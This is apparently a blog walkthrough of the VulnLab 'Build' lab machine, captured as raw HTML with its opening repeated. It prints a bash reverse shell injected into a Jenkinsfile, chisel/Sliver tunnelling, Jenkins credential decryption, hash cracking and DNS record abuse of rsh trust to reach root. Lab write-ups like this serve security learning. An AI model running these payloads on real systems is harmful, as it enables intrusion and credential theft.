class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 23:42 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.90.130</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 9991 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE    SERVICE</span><br><span class=\"line\">22/tcp   open     ssh</span><br><span class=\"line\">53/tcp   open     domain</span><br><span class=\"line\">512/tcp  open     exec</span><br><span class=\"line\">513/tcp  open     login</span><br><span class=\"line\">514/tcp  open     shell</span><br><span class=\"line\">873/tcp  open     rsync</span><br><span class=\"line\">3000/tcp open     ppp</span><br><span class=\"line\">3306/tcp filtered mysql</span><br><span class=\"line\">8081/tcp filtered blackice-icecap</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 126.41 seconds</span><br></pre></td></tr></table></figure>\n\n<p>So as you can see, we have access to decent amount of ports on the target machine. The only issue is that ports <code>3306</code> and <code>8081</code> are filtered, meaning they are current behind a firewall. The only way for us to access these resources is to be on the machine internally.</p>\n<p>As for the other ports, it seems that we have SSH access along with this machine being a DC having port 53. There also seems to be another port on this machine as <code>RSYNC</code>, which we have tested before my writeup for <a href=\"https://dan-feliciano.com/writeups/sync/\">Sync</a>.</p>\n<p>Furthermore, we have access to a web application on port <code>3000</code>, which I’ve referenced before as having the potential to be vulnerable based on the catalog of web applications that use this port. You can find information about what this port can potentially host <a href=\"https://www.speedguide.net/port.php?port=3000\">here</a>.</p>\n<p>There are other ports on here that seem to have apparent vulnerabilities, being <code>512-514</code>, however we can ignore these for now as we’ll need credentials to access them.</p>\n<h1 id=\"Gitea-and-Jenkins\"><a href=\"#Gitea-and-Jenkins\" class=\"headerlink\" title=\"Gitea and Jenkins\"></a>Gitea and Jenkins</h1><p>Let’s access the web application on port <code>3000</code> to see if there’s anything we can exploit.</p>\n<p><img src=\"/images/vulnlab/build-vl/b.png\"></p>\n<p>This seems to bring us to a <a href=\"https://github.com/go-gitea/gitea\">Gitea</a> page, which is essentially a ported web application synced with Git for easy access to web development.</p>\n<p>It seems that we’re able to register for an account in the top left, so I’ll fill in the necessary authorization requirements and see if we can access the application’s login panel.</p>\n<p>After logging in, you can see that the web application has four tabs in the top left. These each access different resources, however the <code>Explore</code> one seems to bring promise as it let’s us explore repositories that were imported to Gitea from other users.</p>\n<p><img src=\"/images/vulnlab/build-vl/c.png\"></p>\n<p>This repository contains one file titled as a <code>Jenkinsfile</code>. I looked into this type of file a bit more, it seems to be linked to the <a href=\"https://www.jenkins.io/doc/book/pipeline/jenkinsfile/\">Jenkins</a> application. This specific application is used for deployment automation in web applications. The <code>Jenkinsfile</code> in particular is a text file that contains the deployment information of a Jenkins Pipeline, used to build different parts of the deployment.</p>\n<p>Since these builds are automated through Jenkins, this file in particular is probably being executed in intervals. The interesting part is that we have access to the source code for this build, meaning if we alter it, it should execute automatically.</p>\n<p>At this point the attack path becomes clear, we’ll need to compromise the <code>buildadm</code> account who has control over this repository and use it to place a reverse shell within the <code>Jenkinsfile</code>. From there, Jenkins should automatically execute this build along with our reverse shell.</p>\n<h1 id=\"RSYNC-File-Enumeration\"><a href=\"#RSYNC-File-Enumeration\" class=\"headerlink\" title=\"RSYNC File Enumeration\"></a>RSYNC File Enumeration</h1><p>Since there isn’t much else to check out on this webpage, let’s turn our attention to RSYNC. To those who aren’t aware, RSYNC s essentially a filesystem mounting&#x2F;share service. It allows administrators to copy files from one particular location in the filesystem to another, or allows them to mount it to a location similar to <code>NFS</code>. This is used if users need to have files copied to another location in a quick-manner. In our case, <code>rsync</code> is a tool that we can examine to determine if there are any files currently within the service that we can retrieve.</p>\n<p>We can list all of the currently archived files within RSYNC with one simple command as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rsync -av --list-only rsync://10.10.90.130</span><br><span class=\"line\">backups         backups</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there’s a <code>backups</code> archive within the contents of RSYNC filesystem, which we can download with the same <code>rsync</code> utility.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rsync -r 10.10.90.130::backups . </span><br><span class=\"line\">rsync: [receiver] write error: Broken pipe (32)</span><br><span class=\"line\">rsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at io.c(1700) [sender=3.2.7]</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls</span><br><span class=\"line\">jenkins.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>The initial <code>rsync</code> download will take a long time as the archive is a big file. I’ve heard notice from some other people who were pen-testing this box that said the download itself took them almost 20 minutes to download. The key here is patience, it was finished in about 2-3 minutes for me.</p>\n<p>It should return a <code>jenkins.tar.gz</code>, which is a double compressed archive. We can decompress it with <code>tar -xvf jenkins.tar.gz</code>. Be prepared for a lot of output the screen.</p>\n<p>This returns the entire archive for the Jenkins application, which we’ll parse to see if any important information is within the filesystem here.</p>\n<p>So you’ll notice that there are a few interesting files in different parts of this filesystem. You’ll find a <code>secret.key</code> file in the root directory along with a <code>hudson.util.Secret</code> and <code>master.key</code> files within the <code>secrets</code> directory.</p>\n<p>Within <code>jenkins_configuration/users/admin_8569439066427679502</code>, you can find a <code>config.xml</code> file that seems to be related to the admin user. You’ll find a hash in this file for that same user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;</span><br><span class=\"line\">    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;</span><br><span class=\"line\">      &lt;passwordHash&gt;#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG&lt;/passwordHash&gt;</span><br><span class=\"line\">    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;</span><br><span class=\"line\">    &lt;hudson.tasks.Mailer_-UserProperty plugin=&quot;mailer@472.vf7c289a_4b_420&quot;&gt;</span><br><span class=\"line\">      &lt;emailAddress&gt;admin@build.vl&lt;/emailAddress&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Although we aren’t relatively 100% confident, I do believe that these files must be linked somehow. I’ll do some research into these files to see if there’s any plaintext passwords we can retrieve from them.</p>\n<h1 id=\"Decrypting-Jenkins-Passwords\"><a href=\"#Decrypting-Jenkins-Passwords\" class=\"headerlink\" title=\"Decrypting Jenkins Passwords\"></a>Decrypting Jenkins Passwords</h1><p>I found a notable utility on GitHub that decrypts these types of passwords. You can find that <a href=\"https://github.com/hoto/jenkins-credentials-decryptor\">here</a>, and it involves using three types of files - the <code>master.key</code> file, the <code>hudson.util.Secret</code> file, and a <code>credentials.xml</code> file.</p>\n<p>The only odd part is that the <code>config.xml</code> file we have for the admin user does not seem to work with those two secret files we have. Which makes sense - this isn’t relative to the <code>buildadm</code> user that we are trying to access.</p>\n<p>I did a bit more poking around the archive and found a file that DOES seem to pertain to the <code>buildadm</code> user, underneath <code>/jenkins_configuration/jobs/build</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;id&gt;e4048737-7acd-46fd-86ef-a3db45683d4f&lt;/id&gt;</span><br><span class=\"line\">&lt;description&gt;&lt;/description&gt;</span><br><span class=\"line\">&lt;username&gt;buildadm&lt;/username&gt;</span><br><span class=\"line\">&lt;password&gt;&#123;AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=&#125;&lt;/password&gt;</span><br><span class=\"line\">&lt;usernameSecret&gt;false&lt;/usernameSecret&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Since we have all the required files needed to decrypt this hash, let’s move them all to our base directory for easier access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ jenkins-credentials-decryptor/bin/jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml -o json</span><br><span class=\"line\">[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;id&quot;: &quot;e4048737-7acd-46fd-86ef-a3db45683d4f&quot;,</span><br><span class=\"line\">    &quot;password&quot;: &quot;[...snip...]&quot;,</span><br><span class=\"line\">    &quot;username&quot;: &quot;buildadm&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>It seems that this specific file decryption script was able to decrypt the password successfully. The password was returned in a JSON format as seen above, which we can now use to access the <code>buildadm</code> user on Gitea.</p>\n<h1 id=\"Build-RCE\"><a href=\"#Build-RCE\" class=\"headerlink\" title=\"Build -&gt; RCE\"></a>Build -&gt; RCE</h1><p>Now that we have access to this user on Gitea, we can take a look at the <code>Jenkinsfile</code> script within their repository.</p>\n<p><img src=\"/images/vulnlab/build-vl/d.png\"></p>\n<p>You can see the respective repository on the right side of the page, or we can access it as we did before in the <code>Explore</code> tab. </p>\n<p>Within the <code>Jenkinsfile</code>, we can select the <code>Edit</code> icon to the right of the file to alter it.</p>\n<p><img src=\"/images/vulnlab/build-vl/e.png\"></p>\n<p>The file itself contains a small script that seems to be running <code>sh &#39;/bin/true&#39;</code>. You can do some research onto <code>Jenkinsfiles</code> to see if there are any reverse shells that we can upload. I found however that you can enclose multiple line scripts within a directory block, to where I got the impression from <a href=\"https://stackoverflow.com/questions/38143485/how-do-i-make-jenkins-2-0-execute-a-sh-command-in-the-same-directory-as-the-chec\">here</a>.</p>\n<p>Let’s use a simple reverse shell to exploit this, you can find them on <a href=\"https://www.revshells.com/\">Revshells</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pipeline &#123;</span><br><span class=\"line\">    agent any</span><br><span class=\"line\"></span><br><span class=\"line\">    stages &#123;</span><br><span class=\"line\">        stage(&#x27;Do nothing&#x27;) &#123;</span><br><span class=\"line\">            steps &#123;</span><br><span class=\"line\">                sh &#x27;&#x27;&#x27;</span><br><span class=\"line\">                bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.8.0.173/9001 0&gt;&amp;1&#x27;</span><br><span class=\"line\">                &#x27;&#x27;&#x27;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then start up a reverse shell and wait for this pipeline to execute after we save the file. I’m assuming that this is automated so we’ll need to wait probably a minute or two depending on how often the build is deployed.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc -lvnp 9001       </span><br><span class=\"line\">listening on [any] 9001 ...</span><br><span class=\"line\">connect to [10.8.0.173] from (UNKNOWN) [10.10.90.130] 45014</span><br><span class=\"line\">bash: cannot set terminal process group (7): Inappropriate ioctl for device</span><br><span class=\"line\">bash: no job control in this shell</span><br><span class=\"line\">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#</span><br></pre></td></tr></table></figure>\n\n<p>After a short amount of time after committing to the branch, you’ll see that we’ll receive a callback on our machine that generated a reverse shell.</p>\n<p>The user flag is within <code>/root</code>.</p>\n<h1 id=\"Chisel-Tunneling\"><a href=\"#Chisel-Tunneling\" class=\"headerlink\" title=\"Chisel Tunneling\"></a>Chisel Tunneling</h1><p>Given that we’re already root on this machine and we have only gotten a user flag, I’m assuming that we’re in a container of some sort. This along with the fact that the delimiter after our username on the TTY seems to be an odd string of characters.</p>\n<p>You’ll notice that we don’t have access to basic tools such as <code>netstat</code> or <code>ip</code>, which are generally installed by default on Linux machines. This solidifies my theory that we’re currently in a container, so we’ll need to perform a breakout to be able to access the actual machine. I’ll set up a <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> C2 server so that we can enumerate the filesystem a little easier.</p>\n<p>So one thing as I mentioned before, we don’t have access to <code>netstat</code> or <code>ifconfig</code> due to the containers limitations, so we don’t know what the address is of this container. There is an alternative though, which is within <code>/proc/net/route</code>. This file shows all of the network interfaces and a hexadecimal version of their destination  and gateway IP addresses. There’s a way to decode this, which you can find <a href=\"https://www.browserling.com/tools/hex-to-ip\">here</a>.</p>\n<p>After decoding them, you’ll find that it’s backwards. The host seems to be <code>172.18.0.1</code>.</p>\n<p>Immediately though, I remembered that there was port 8081 and port 3306 running on this machine through a firewall. Although we are within a container, there’s a chance that we can still access these two ports remotely. We’ll use a tool called <a href=\"https://github.com/jpillora/chisel\">Chisel</a>, and attempt to redirect these services back to our localhost for us to access.</p>\n<p>You’ll need to upload the chisel binary to the container as well as have your own to start the server. We’ll use a socks proxy along with <code>proxychains4</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ./chisel server --reverse --port 8001            </span><br><span class=\"line\">2024/06/03 13:48:43 server: Reverse tunnelling enabled</span><br><span class=\"line\">2024/06/03 13:48:43 server: Fingerprint CrkDZ/Wi1k4tB14kgS3IOxLFVNgd4mQ/r/aKuFchUII=</span><br><span class=\"line\">2024/06/03 13:48:43 server: Listening on http://0.0.0.0:8001</span><br></pre></td></tr></table></figure>\n\n<p>Then on the remote machine, execute the chisel client to connect back to this server we just stood up.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (build) &gt; execute chisel client 10.8.0.173:8001 R:socks</span><br><span class=\"line\">[*] Command executed successfully</span><br></pre></td></tr></table></figure>\n\n<p>You’ll need to edit your <code>/etc/proxychains4.conf</code> to reflect on the address that the socks proxy is listening on. This generally is on port 1080&#x2F;1081, the chisel server output should give you the answer.</p>\n<p>Now that we’re tunneled directly to the machine, we can attempt to access the MySQL database on our Kali machine by using <code>proxychains</code>.</p>\n<h1 id=\"Enumerating-MySQL\"><a href=\"#Enumerating-MySQL\" class=\"headerlink\" title=\"Enumerating MySQL\"></a>Enumerating MySQL</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 -q mysql -u root -h 172.18.0.1 -p</span><br><span class=\"line\">Enter password: </span><br><span class=\"line\">Welcome to the MariaDB monitor.  Commands end with ; or \\g.</span><br><span class=\"line\">Your MariaDB connection id is 51</span><br><span class=\"line\">Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution</span><br><span class=\"line\"></span><br><span class=\"line\">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class=\"line\"></span><br><span class=\"line\">Support MariaDB developers by giving a star at https://github.com/MariaDB/server</span><br><span class=\"line\">Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure>\n\n<p>After a bit of enumeration, I found a hash for <code>PowerDNS</code> within the <code>powerdnsadmin</code> database underneath the <code>user</code> table. This specific hash seems to be encoded with <code>bcrypt</code>, as denoted by the <code>$2b$</code> delimiter.</p>\n<p><code>JTR</code> can do the heavy lifting for us in this case, to which I also made sure to place this hash within its own text file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ john powerdns.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class=\"line\">Will run 4 OpenMP threads</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">[...snip...]          (?)     </span><br><span class=\"line\">1g 0:00:01:18 DONE (2024-06-03 14:18) 0.01270g/s 16.92p/s 16.92c/s 16.92C/s winston..incubus</span><br><span class=\"line\">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the hash to PowerDNS, we’ll need to find a way to access its resources to be able to login.</p>\n<p>If you try to access port <code>8081</code> through a reverse port forward (outlined below):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (build) &gt; execute chisel client 10.8.0.173:8002 R:8081:127.0.0.1:8081</span><br></pre></td></tr></table></figure>\n\n<p>You’ll find that you can’t access the resources that simply. If you think about, we’re currently using the gateway of the container, however we aren’t able to simple just access the resources from this gateway. The ports themselves are forwarded from different machines across the <code>172</code> subnet.</p>\n<p>To get more of what I mean, you can refer to the <code>records</code> table within the MySQL <code>powerdnsadmin</code> database to see the IP range of this machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [powerdnsadmin]&gt; select * from records;</span><br><span class=\"line\">+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span><br><span class=\"line\">| id | domain_id | name                 | type | content                                                                                  | ttl  | prio | disabled | ordername | auth |</span><br><span class=\"line\">+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span><br><span class=\"line\">|  8 |         1 | db.build.vl          | A    | 172.18.0.4                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">|  9 |         1 | gitea.build.vl       | A    | 172.18.0.2                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 10 |         1 | intern.build.vl      | A    | 172.18.0.1                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 11 |         1 | jenkins.build.vl     | A    | 172.18.0.3                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 12 |         1 | pdns-worker.build.vl | A    | 172.18.0.5                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 13 |         1 | pdns.build.vl        | A    | 172.18.0.6                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 14 |         1 | build.vl             | SOA  | a.misconfigured.dns.server.invalid hostmaster.build.vl 2024050201 10800 3600 604800 3600 | 1500 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span><br><span class=\"line\">7 rows in set (0.148 sec)</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the PowerDNS admin service seems to be running on either <code>.05</code> or <code>.06</code>. We can run a simple bash loop to determine which is which.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ for i in &#123;5..6&#125;; do proxychains4 -q nmap -p8081 172.18.0.$i; done</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 14:33 EDT</span><br><span class=\"line\">Nmap scan report for 172.18.0.5</span><br><span class=\"line\">Host is up (0.57s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">8081/tcp open  blackice-icecap</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 14:33 EDT</span><br><span class=\"line\">Nmap scan report for 172.18.0.6</span><br><span class=\"line\">Host is up (0.68s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE  SERVICE</span><br><span class=\"line\">8081/tcp closed blackice-icecap</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems that the access point is on <code>.05</code>. Let’s try to access it through our web browser. We’ll need to use FoxyProxy and tunnel it through our SOCKS proxy in order to access the website. If we tried to do this without a web proxy, we wouldn’t be able to reach the machine.</p>\n<p><img src=\"/images/vulnlab/build-vl/f.png\"></p>\n<p>Once that’s up and running, be sure to enable it.</p>\n<p>You’ll come into an issue that seems to prevent you from accessing the PowerDNS admin page. This is due to the fact that this is actually behind another firewall. However, if you were to run another NMAP scan against <code>172.18.0.6</code>, you’ll find that there’s actually a web server running on that port.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 15:29 EDT</span><br><span class=\"line\">Nmap scan report for 172.18.0.6</span><br><span class=\"line\">Host is up (0.33s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE  SERVICE</span><br><span class=\"line\">80/tcp   open   http</span><br><span class=\"line\">8081/tcp closed blackice-icecap</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"DNS-Record-Manipulation\"><a href=\"#DNS-Record-Manipulation\" class=\"headerlink\" title=\"DNS Record Manipulation\"></a>DNS Record Manipulation</h1><p>We can try to access the webserver through our web proxy, and it should land us at the PowerDNS login.</p>\n<p><img src=\"/images/vulnlab/build-vl/g.png\"></p>\n<p>Let’s now login with the <code>admin</code> creds that we cracked earlier. This should bring you to the dashboard for PowerDNS, to which you can access the Zone Records pane to view the DNS records for <code>build.vl</code>.</p>\n<p><img src=\"/images/vulnlab/build-vl/h.png\"></p>\n<p>Now that we have access to the zone records for this domain specifically, there’s a bit of misconfiguration that we can exploit.</p>\n<p>If you remember from before, there were ports <code>512-514</code> that were designated to the RSH service. This is essentially a much more insecure version of SSH, which in some cases can allow for unauthorized login as the root user if misconfigured. You can find more information about this <a href=\"https://www.ssh.com/academy/ssh/rsh\">here</a>.</p>\n<p>The interesting note about this is that the specific DNS servers that are able to access RSH are designated within a <code>.rhosts</code> file. This file was within the <code>/root</code> directory of the container that we previously had access to, and contained the following contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@5ac6c7d6fb8e:~# cat .rhosts</span><br><span class=\"line\">admin.build.vl +</span><br><span class=\"line\">intern.build.vl +</span><br></pre></td></tr></table></figure>\n\n<p>This means that the RSH client trusts both <code>intern</code> and <code>admin</code>, though you’ll see that only <code>intern</code> is configured.</p>\n<p>If we configure <code>admin</code> to point to our IP address, of our Kali machine, then we should theoretically be able to authenticate through RSH to the machine.</p>\n<p><img src=\"/images/vulnlab/build-vl/i.png\"></p>\n<h1 id=\"Misconfigured-RSH-Login\"><a href=\"#Misconfigured-RSH-Login\" class=\"headerlink\" title=\"Misconfigured RSH Login\"></a>Misconfigured RSH Login</h1><p>Now that it’s configured, let’s try to use <code>rlogin</code> to authenticate as the root user to the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rlogin root@10.10.94.174</span><br><span class=\"line\">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)</span><br><span class=\"line\">......</span><br><span class=\"line\">root@build:~#</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that it authenticated us properly, and we were able to access the <code>build</code> machine. Given that we now have access to this, you’ll actually notice that the directory <code>/root/scripts/root/</code> is a mount of the root directory of the container.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@build:~/scripts/root# ls -la</span><br><span class=\"line\">total 17884</span><br><span class=\"line\">drwxr-xr-x 3 root root    4096 Jun  3 19:23 .</span><br><span class=\"line\">drwxr-xr-x 6 root root    4096 May  2 15:35 ..</span><br><span class=\"line\">lrwxrwxrwx 1 root root       9 May  1 14:37 .bash_history -&gt; /dev/null</span><br><span class=\"line\">-rwxrwxrwx 1 root root 9637888 Jun  3 19:23 build</span><br><span class=\"line\">-rwxrwxrwx 1 root root 8654848 Jun  3 19:23 chisel</span><br><span class=\"line\">-r-------- 1 root root      35 May  1 17:37 .rhosts</span><br><span class=\"line\">drwxr-xr-x 2 root root    4096 May  1 16:05 .ssh</span><br><span class=\"line\">-rw------- 1 root root      37 May  1 14:29 user.txt</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, this further solidifies the fact that this machine had access to the container through RSH by utilizing the <code>.rhosts</code> file. If this specific file had not been within this directory, there’s a chance we would’ve never been able to exploit this without altering the web contents of a container that we had access to and that we knew WAS connected to the machine.</p>\n<p>This specific vulnerability was just a misconfiguration on the <code>intern</code> users part, which could’ve been due to wanting the main machine to be able to authenticate through RSH to the container.</p>\n<p>Nonetheless, now that we have access to root on the main machine, we can view the root flag in <code>/root/root.txt</code>. This means we have successfully completed this machine!</p>\n<p><img src=\"/images/vulnlab/build-vl/j.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was probably the longest I’ve done, and it took a lot of brainstorming as to what the next part of the attack path was. I’ve always struggled with machines that are heavy on web-app exploits, so this was great learning material to practice. Big thank you to xct for the development of this machine!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://dan-feliciano.com/writeups/sync/\">https://dan-feliciano.com/writeups/sync/</a><br><a href=\"https://www.speedguide.net/port.php?port=3000\">https://www.speedguide.net/port.php?port=3000</a><br><a href=\"https://github.com/go-gitea/gitea\">https://github.com/go-gitea/gitea</a><br><a href=\"https://www.jenkins.io/doc/book/pipeline/jenkinsfile/\">https://www.jenkins.io/doc/book/pipeline/jenkinsfile/</a><br><a href=\"https://github.com/hoto/jenkins-credentials-decryptor\">https://github.com/hoto/jenkins-credentials-decryptor</a><br><a href=\"https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76\">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://stackoverflow.com/questions/48316346/gitea-and-jenkins-webhook\">https://stackoverflow.com/questions/48316346/gitea-and-jenkins-webhook</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://github.com/jpillora/chisel\">https://github.com/jpillora/chisel</a><br><a href=\"https://www.ssh.com/academy/ssh/rsh\">https://www.ssh.com/academy/ssh/rsh</a></p>\n","cover_type":"img","excerpt":"","more":"<p>The is one of the latest VulnLab machines that released in the Easy category, and it was a really well-put together machine. It offers practice into relatively unused ports and applications - also having us tunnel machine resources through a firewall.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scans of the machine. Note that I ran a port range scan from <code>1-10000</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 23:42 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.90.130</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 9991 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE    SERVICE</span><br><span class=\"line\">22/tcp   open     ssh</span><br><span class=\"line\">53/tcp   open     domain</span><br><span class=\"line\">512/tcp  open     exec</span><br><span class=\"line\">513/tcp  open     login</span><br><span class=\"line\">514/tcp  open     shell</span><br><span class=\"line\">873/tcp  open     rsync</span><br><span class=\"line\">3000/tcp open     ppp</span><br><span class=\"line\">3306/tcp filtered mysql</span><br><span class=\"line\">8081/tcp filtered blackice-icecap</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 126.41 seconds</span><br></pre></td></tr></table></figure>\n\n<p>So as you can see, we have access to decent amount of ports on the target machine. The only issue is that ports <code>3306</code> and <code>8081</code> are filtered, meaning they are current behind a firewall. The only way for us to access these resources is to be on the machine internally.</p>\n<p>As for the other ports, it seems that we have SSH access along with this machine being a DC having port 53. There also seems to be another port on this machine as <code>RSYNC</code>, which we have tested before my writeup for <a href=\"https://dan-feliciano.com/writeups/sync/\">Sync</a>.</p>\n<p>Furthermore, we have access to a web application on port <code>3000</code>, which I’ve referenced before as having the potential to be vulnerable based on the catalog of web applications that use this port. You can find information about what this port can potentially host <a href=\"https://www.speedguide.net/port.php?port=3000\">here</a>.</p>\n<p>There are other ports on here that seem to have apparent vulnerabilities, being <code>512-514</code>, however we can ignore these for now as we’ll need credentials to access them.</p>\n<h1 id=\"Gitea-and-Jenkins\"><a href=\"#Gitea-and-Jenkins\" class=\"headerlink\" title=\"Gitea and Jenkins\"></a>Gitea and Jenkins</h1><p>Let’s access the web application on port <code>3000</code> to see if there’s anything we can exploit.</p>\n<p><img src=\"/images/vulnlab/build-vl/b.png\"></p>\n<p>This seems to bring us to a <a href=\"https://github.com/go-gitea/gitea\">Gitea</a> page, which is essentially a ported web application synced with Git for easy access to web development.</p>\n<p>It seems that we’re able to register for an account in the top left, so I’ll fill in the necessary authorization requirements and see if we can access the application’s login panel.</p>\n<p>After logging in, you can see that the web application has four tabs in the top left. These each access different resources, however the <code>Explore</code> one seems to bring promise as it let’s us explore repositories that were imported to Gitea from other users.</p>\n<p><img src=\"/images/vulnlab/build-vl/c.png\"></p>\n<p>This repository contains one file titled as a <code>Jenkinsfile</code>. I looked into this type of file a bit more, it seems to be linked to the <a href=\"https://www.jenkins.io/doc/book/pipeline/jenkinsfile/\">Jenkins</a> application. This specific application is used for deployment automation in web applications. The <code>Jenkinsfile</code> in particular is a text file that contains the deployment information of a Jenkins Pipeline, used to build different parts of the deployment.</p>\n<p>Since these builds are automated through Jenkins, this file in particular is probably being executed in intervals. The interesting part is that we have access to the source code for this build, meaning if we alter it, it should execute 